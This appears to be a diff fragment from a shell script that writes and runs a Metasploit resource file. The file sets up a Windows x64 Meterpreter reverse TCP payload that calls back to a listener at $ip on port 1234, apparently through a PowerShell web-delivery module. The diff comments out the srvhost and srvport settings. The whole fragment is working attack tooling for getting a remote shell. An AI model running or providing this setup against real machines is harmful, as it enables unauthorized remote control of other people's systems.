@@ -6,8 +6,8 @@ set target 2
 set payload windows/x64/meterpreter/reverse_tcp
 set lport 1234
 set lhost  $ip
-set srvhost 0.0.0.0
-set srvport 8080
+# set srvhost 0.0.0.0
+# set srvport 8080
 run
 EOF
 msfconsole -r msf_web_powershell_rev_x64.rc
